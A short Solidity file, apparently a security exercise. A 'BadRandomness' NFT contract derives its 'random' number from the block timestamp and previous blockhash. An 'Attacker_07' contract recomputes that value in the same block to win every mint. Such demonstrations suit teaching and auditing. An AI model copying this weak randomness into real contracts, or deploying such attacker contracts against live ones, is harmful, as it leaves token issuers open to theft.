// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract BadRandomness is ERC721 {
  uint256 public totalSupply;

  constructor() ERC721("", "") {}

  function luckyMint(uint256 guess) public {
    uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1)))) % 100;
    require(guess == random, "guess mismatch");
    _mint(msg.sender, totalSupply);
    totalSupply += 1;
  }
}

contract Attacker_07 {

  BadRandomness private _badRandomness;

  constructor(address badRandomAddress) {
    _badRandomness = BadRandomness(badRandomAddress);
  }

  function attack() public {
    uint256 guess = uint256(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1)))) % 100;
    _badRandomness.luckyMint(guess);
  }
}